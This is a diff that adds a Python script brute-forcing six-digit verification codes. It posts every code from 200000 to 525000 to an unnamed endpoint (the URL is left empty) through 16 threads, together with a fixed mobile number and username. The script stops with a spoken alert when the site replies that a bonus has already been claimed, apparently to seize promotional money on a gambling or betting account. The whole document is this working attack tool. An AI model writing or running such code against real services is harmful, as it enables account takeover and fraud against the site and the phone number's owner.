@@ -1,0 +1,82 @@
+import pyttsx3
+import requests
+import os
+import time
+import threading
+from concurrent.futures.thread import ThreadPoolExecutor
+
+session = requests.Session()
+adapter = requests.adapters.HTTPAdapter(pool_connections=150, pool_maxsize=50)
+session.mount('http://', adapter)
+#
+total_data = 0  # 用来记录发送数据的总量
+
+def cc(i):
+    global total_data
+    a = ("%06d" % i)
+    url = ''
+    data = {
+        'mobile': '17606109448',
+        'username': 'duumn8',
+        'code': a
+    }
+    try:
+        resp = session.post(url, data=data, stream=True)
+        ip_and_port = resp.raw._connection.sock.getpeername()
+        b = resp.json()
+        # print(a, b)
+        if b.get('msg') == "彩金已领取，请勿重复申请！":
+            engine = pyttsx3.init()
+            engine.say("彩金已领取，请勿重复申请！")
+            engine.runAndWait()
+            os._exit(0)
+        total_data += 1  # 统计发送的数据总量
+    except:
+        pass
+
+def process_batch(start_id, stop_id):
+    print(f"开始处理任务批次：{start_id} - {stop_id}")
+    with ThreadPoolExecutor(max_workers=16) as t:
+        t.map(cc, range(start_id, stop_id))
+    print(f"任务批次 {start_id} - {stop_id} 处理完毕")
+
+if __name__ == '__main__':
+    args_list = [(200000, 220312),(220312, 240624),(240625, 260938),(260938, 281250),
+(281250, 301562),(301562, 321874),(321875, 342188),(342188, 362500),
+(362500, 382812),(382812, 403124),(403125, 423438),(423438, 443750),
+(443750, 464062),(464062, 484374),(484375, 504688),(504688, 525000),]
+
+
+
+
+
+
+
+
+
+
+    # 设置计时器开始时间
+    start_time = time.time()
+
+
+    # 创建一个定时器线程，10分钟后强制终止程序运行
+    def timer():
+        time.sleep(600)
+        print("代码运行时间已超过10分钟，程序即将退出...")
+        engine = pyttsx3.init()  # 创建engine并初始化
+        engine.say("代码运行时间已超过10分钟，程序即将退出")
+        engine.runAndWait()
+        # 计算运行时间和发送数据量
+        elapsed_time = time.time() - start_time
+        print(f"总共发送数据量：{total_data} 字节")
+        print(f"总共运行时间：{elapsed_time:.2f} 秒")
+        os._exit(0)
+
+
+    timer_thread = threading.Thread(target=timer)
+    timer_thread.start()
+
+    # 使用线程池处理任务批次
+    with ThreadPoolExecutor(max_workers=16) as t:
+        t.map(lambda args: process_batch(*args), args_list)
+
